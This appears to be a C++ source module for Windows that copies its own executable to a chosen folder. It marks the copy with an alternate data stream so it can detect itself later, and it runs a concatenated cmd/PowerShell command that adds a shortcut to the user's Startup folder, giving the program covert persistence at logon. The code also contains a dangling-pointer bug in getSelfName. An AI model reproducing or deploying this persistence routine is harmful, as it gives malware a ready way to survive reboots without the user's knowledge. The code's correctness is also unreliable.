#include <windows.h>
#include <iostream>
#include <fstream>

//For username
#include <Lmcons.h>
//

//For selfName
#include <shlwapi.h>
//

//For exec
#include <tchar.h>
//

//Compiler flags: -s -static-libstdc++ -static-libgcc -static  -luser32 -lshlwapi

std::string gsfcp(const char* s) { return std::string(s); }

bool access_(std::string path) {
    std::ifstream file(path);
    if (!file.is_open()) {
        return false;
    }
    file.close();
    return true;
}

std::string getUName() {
    TCHAR username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);
    return std::string(username);
}

extern "C" const char* __cdecl getSelfName() {
    TCHAR filename[MAX_PATH];
    GetModuleFileName(NULL, filename, MAX_PATH);
    TCHAR *filename_only = PathFindFileName(filename);
    return std::string(filename_only).c_str();
}

extern "C" bool __cdecl access(const char* filePath) { return access_(gsfcp(filePath)); }
extern "C" bool __cdecl isStartup() { return (access_(std::string(getSelfName()) + ":startup")); }

extern "C" int __cdecl moveSelfStartup(const char* path_, const char* sName_) {//Use a full path (From drive letter to filder with '/' at the end!)
    std::string self = getSelfName();
    std::string path = gsfcp(path_);
    std::string sName = gsfcp(sName_);
    if (isStartup()) { return 1; }//The current file is already processed by this code. (Alternate Data Stream detected)
    std::string pStartup = "C:/Users/" + getUName() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
    std::string psCmd = "powershell.exe -Command \"& { Set-Location '" + pStartup + "'; $ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut($pwd.Path + '\\" + sName + ".lnk'); $s.TargetPath = '" + path + self + "'; $s.Save() }\"";
    std::string oneToRuleThemAll = "@echo off && type \"" + self + "\" >> \"" + path + self + "\" && echo check > \"" + path + self + ":startup\" && cd \"" + pStartup + "\" && " + psCmd;

    system(oneToRuleThemAll.c_str());

    return 0;
}
//
